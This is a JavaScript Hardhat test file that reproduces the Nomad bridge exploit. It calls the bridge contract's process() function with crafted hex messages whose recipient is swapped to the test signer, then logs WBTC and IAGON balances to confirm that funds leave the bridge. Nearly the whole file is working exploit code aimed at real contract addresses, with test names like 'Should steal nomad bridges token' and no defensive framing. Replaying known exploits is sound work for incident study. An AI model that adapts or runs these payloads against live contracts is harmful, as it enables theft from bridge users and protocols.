const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");


const nomad_address = "0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3";
const nomad_contract = "0x5d94309e5a0090b165fa4181519701637b6daeba";
const wbtc_address = "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599";
const swap_address = "0x5D94309E5a0090b165FA4181519701637B6DAEBA";
const nomad_bridge_exploiter_1 = "0x56D8B635A7C88Fd1104D23d632AF40c1C3Aac4e3";
const the_attacker = "0xe4a4df7e1689589efb06ec8c7c601b1cb193c5b3";

const iagon_address = "0x40EB746DEE876aC1E78697b7Ca85142D178A1Fc8";

/*
describe("Nomad", function () {
  it("Should steal nomad bridges token", async function () {

    const WBTC = await ethers.getContractAt("IERC20", wbtc_address);

    const nomad = await ethers.getContractAt("INomad", nomad_contract);

    const [attacker] = await ethers.getSigners();
    console.log("Attacker:", attacker.address)

    let bridgeBalanceBefore = await WBTC.balanceOf(nomad_address);
    console.log("Bridge balance:", ethers.utils.formatUnits(bridgeBalanceBefore, 8))

    let attackerBalanceBefore = await WBTC.balanceOf(attacker.address);
    console.log("Attacker balance before:", ethers.utils.formatUnits(attackerBalanceBefore, 8))

    //await nomad.connect(attacker).process("0x6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000e4a4df7e1689589efb06ec8c7c601b1cb193c5b300000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a")

    await nomad.connect(attacker).process("0x6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000" + "f39Fd6e51aad88F6F4ce6aB8827279cffFb92266" + "00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a")


    let bridgeBalanceAfter = await WBTC.balanceOf(nomad_address);
    console.log("Bridge balance after:", ethers.utils.formatUnits(bridgeBalanceAfter, 8))

    //let theAttackerBalance = await WBTC.balanceOf(the_attacker);
    //console.log("The attacker balance:", ethers.utils.formatUnits(theAttackerBalance, 8))

    let attackerBalance = await WBTC.balanceOf(attacker.address);
    console.log("Attacker balance after:", ethers.utils.formatUnits(attackerBalance, 8))

  });

});
*/

describe("Nomad", function () {
  it("Should steal nomad bridges token 2", async function () {

    const IAGON = await ethers.getContractAt("IERC20", iagon_address);
    const nomad = await ethers.getContractAt("INomad", nomad_contract);

    const [attacker] = await ethers.getSigners();
    console.log("Attacker:", attacker.address)

    let bridgeBalanceBefore = await IAGON.balanceOf(nomad_address);
    console.log("Bridge IAGON balance before:", ethers.utils.formatUnits(bridgeBalanceBefore, 18))

    let attackerBalanceBefore = await IAGON.balanceOf(attacker.address);
    console.log("Attacker balance before:", ethers.utils.formatUnits(attackerBalanceBefore, 18))

    await nomad.connect(attacker).process("0x65766d730000000000000000000000002eff94f8c56c20f85d45e9752bfec3c0522c55c700002de90065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a30065746800000000000000000000000040eb746dee876ac1e78697b7ca85142d178a1fc803000000000000000000000000" + "f39Fd6e51aad88F6F4ce6aB8827279cffFb92266" + "000000000000000000000000000000000000000000001fc5af4729b102cbd00008dd7e875c6f07eb114044d484f7f37e03ee359aac52cdd4b00af4d97e78c637")

    let bridgeBalanceAfter = await IAGON.balanceOf(nomad_address);
    console.log("Bridge IAGON balance after:", ethers.utils.formatUnits(bridgeBalanceAfter, 18))

    let attackerBalance = await IAGON.balanceOf(attacker.address);
    console.log("Attacker balance after:", ethers.utils.formatUnits(attackerBalance, 18))

  })
})
